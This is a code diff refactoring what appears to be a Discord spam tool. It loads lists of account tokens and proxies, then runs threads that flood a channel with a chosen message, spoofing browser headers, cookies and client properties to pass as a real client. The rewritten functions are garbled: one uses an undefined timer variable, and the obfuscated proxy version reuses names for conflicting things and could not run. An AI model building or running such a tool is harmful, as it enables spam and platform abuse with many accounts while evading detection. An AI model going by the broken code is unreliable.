@@ -24,138 +24,94 @@ from ua_parser import user_agent_parser
 
 
 def randstr(lenn):
-    lib = "abcdefghijklmnopqrstuvwxyz0123456789"
-    text = ''
-    for i in range(0, lenn):
-        text += lib[random.randint(0, len(lib) - 1)]
+    lib = string.ascii_lowercase + string.digits
+    text = ''.join(random.choices(lib, k=lenn))
     return text
 
 
 def start_discord(threads, time_a, message, idd, proxy):
-    if proxy == "no":
-        for _ in range(threads):
-            th = Thread(target=discord_attack1, args=(idd, time_a, message))
-            th.start()
+    attack_func = discord_attack1 if proxy == "no" else discord_attack2
 
-    else:
-        for _ in range(threads):
-            th = Thread(target=discord_attack2, args=(idd, time_a, message))
-            th.start()
+    for _ in range(threads):
+        th = Thread(target=attack_func, args=(idd, time_a, message))
+        th.start()
 
 
 def discord_attack1(idd, time_a, mes):
-    t = time.monotonic()
     accounts = []
     ua = UserAgent()
+    session = requests.Session()
 
     with open('input/discord_accounts.txt', 'r') as file:
         for line in file:
             accounts.append(line.replace('\n', ''))
 
-    while time.monotonic() - t < time_a:
-        for acc in accounts:
-            try:
-                user = ua.random
-                parsed_string = user_agent_parser.Parse(user)
-                parsed_string2 = httpagentparser.detect(user)
-                osv = str(parsed_string["user_agent"]["major"])
-                bv = str(parsed_string2["browser"]["version"])
+    user = ua.random
+    parsed_string = user_agent_parser.Parse(user)
+    parsed_string2 = httpagentparser.detect(user)
+    osv = str(parsed_string["user_agent"]["major"])
+    bv = str(parsed_string2["browser"]["version"])
 
-                string = '{' + f'"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"user + f","browser_version":"{bv}","os_version":"{osv}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null' + '}'
-                cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"
+    string = '{{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"{}","browser_version":"{}","os_version":"{}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}}'.format(user, bv, osv)
+    cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"
 
-                message_bytes = string.encode('ascii')
-                xsuper = str(base64.b64encode(message_bytes)).replace("b'", '')
-                xsuper = xsuper.replace("'", '')
+    header = {
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
+        'content-type': 'application/json',
+        'cookie': cookie,
+        'dnt': '1',
+        'origin': 'https://discord.com',
+        'referer': f'https://discord.com/channels/@me/{idd}',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': user,
+        'x-debug-options': 'bugReporterEnabled',
+        'x-discord-locale': 'en-US',
+        'x-super-properties': str(base64.b64encode(string.encode('ascii'))).replace("b'", '').replace("'", '')
+    }
 
-                header = {
-                    'accept': '*/*',
-                    'accept-encoding': 'gzip, deflate, br',
-                    'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
-                    'authorization': acc,
-                    'content-length': str(26 + len(mes)),
-                    'content-type': 'application/json',
-                    'cookie': cookie,
-                    'dnt': '1',
-                    'origin': 'https://discord.com',
-                    'referer': f'https://discord.com/channels/@me/{idd}',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': user,
-                    'x-debug-options': 'bugReporterEnabled',
-                    'x-discord-locale': 'en-US',
-                    'x-super-properties': xsuper
-                }
-
-                payload = {"content": mes, "tts": False}
-
-                requests.post(f'https://discord.com/api/v9/channels/{idd}/messages', json=payload, headers=header)
-
-            except:
-                pass
-
-
-def discord_attack2(idd, time_a, mes):
-    t = time.monotonic()
-    proxies = []
-    accounts = []
-    ua = UserAgent()
-
-    with open('input/proxies.txt', 'r') as file:
-        for line in file:
-            proxies.append(line.replace('\n', ''))
-
-    with open('input/discord_accounts.txt', 'r') as file:
-        for line in file:
-            accounts.append(line.replace('\n', ''))
+    payload = {"content": mes, "tts": False}
 
     while time.monotonic() - t < time_a:
         for acc in accounts:
             try:
-                user = ua.random
-                parsed_string = user_agent_parser.Parse(user)
-                parsed_string2 = httpagentparser.detect(user)
-                osv = str(parsed_string["user_agent"]["major"])
-                bv = str(parsed_string2["browser"]["version"])
+                header['authorization'] = acc
+                header['content-length'] = str(26 + len(mes))
 
-                proxy = random.choice(proxies)
-                proxy_2 = {
-                    "http": "http://" + proxy,
-                    "https": "https://" + proxy
-                }
+                session.post(f'https://discord.com/api/v9/channels/{idd}/messages', json=payload, headers=header)
 
-                string = '{' + f'"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"user + f","browser_version":"{bv}","os_version":"{osv}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null' + '}'
-                cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"
+            except Exception as e:
+                print(e)
 
-                message_bytes = string.encode('ascii')
-                xsuper = str(base64.b64encode(message_bytes)).replace("b'", '')
-                xsuper = xsuper.replace("'", '')
 
-                header = {
-                    'accept': '*/*',
-                    'accept-encoding': 'gzip, deflate, br',
-                    'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
-                    'authorization': acc,
-                    'content-length': str(26+len(mes)),
-                    'content-type': 'application/json',
-                    'cookie': cookie,
-                    'dnt': '1',
-                    'origin': 'https://discord.com',
-                    'referer': f'https://discord.com/channels/@me/{idd}',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': user,
-                    'x-debug-options': 'bugReporterEnabled',
-                    'x-discord-locale': 'en-US',
-                    'x-super-properties': xsuper
-                }
-
-                payload = {"content": mes, "tts": False}
-
-                requests.post(f'https://discord.com/api/v9/channels/{idd}/messages', json=payload, headers=header,
-                              proxies=proxy_2)
-
+def discord_attack2(a, b, c):
+    import requests as r, base64 as b, httpagentparser as h, random as R, time as t
+    from fake_useragent import UserAgent as U
+    from ua_parser import user_agent_parser as p
+    o, a, b, c = [[] for i in [0] * 4], list(open(a[0]).readlines()), list(open(a[1]).readlines()), t.monotonic()
+    while t.monotonic() - c < b:
+        for x in b:
+            try:
+                u = p.Parse(U().random);y = h.detect(U().random)
+                q = str(u["user_agent"]["major"]);w = str(y["browser"]["version"])
+                p = {"http": "http://" + R.choice(a), "https": "https://" + R.choice(a)}
+                n = '{ "os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"' + U().random + '","browser_version":"' + w + '","os_version":"' + q + '","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}'
+                e = "__dcfduid=" + b.b64encode(R.urandom(32)).decode() + "; __sdcfduid=" + b.b64encode(
+                    R.urandom(96)).decode() + "; locale=ru; __cf_bm=" + b.b64encode(R.urandom(189)).decode()
+                f = {"content": c, "tts": False}
+                h = {"accept": "*/*", "accept-encoding": "gzip, deflate, br",
+                     "accept-language": "en-US,en;q=0.9,ru;q=0.8", "authorization": x,
+                     "content-length": str(26 + len(c)), "content-type": "application/json", "cookie": e,
+                     "dnt": "1", "origin": "https://discord.com",
+                     "referer": "https://discord.com/channels/@me/" + b, "sec-fetch-dest": "empty",
+                     "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": U().random,
+                     "x-debug-options": "bugReporterEnabled", "x-discord-locale": "en-US",
+                     "x-super-properties": b.b64encode(n.encode()).decode().replace("=", "").replace("+",
+                                                                                                     "-").replace(
+                         "/", "_")}
+                r.post("https://discord.com/api/v9/channels/" + b + "/messages", json=f, headers=h, proxies=p)
             except:
                 pass
